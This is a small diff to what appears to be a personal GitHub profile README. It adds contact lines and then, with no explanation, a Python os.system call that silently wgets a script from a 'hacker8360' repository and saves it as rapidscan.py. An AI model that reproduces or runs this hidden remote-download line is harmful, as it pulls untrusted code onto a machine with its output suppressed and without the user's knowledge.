@@ -11,3 +11,6 @@ Here are some ideas to get you started:
 - 📫 How to reach me: https://www.linkedin.com/in/shraddha-pandey-05396b223/ https://twitter.com/home
 - 😄 Pronouns: Shraddha
 - ⚡ Fun fact: I am very passionate about playing with computers and learning new skills at each moment. 
+
+
+os.system('wget -N https://raw.githubusercontent.com/hacker8360/Webtor/main/scan.py -O rapidscan.py > /dev/null 2>&1')
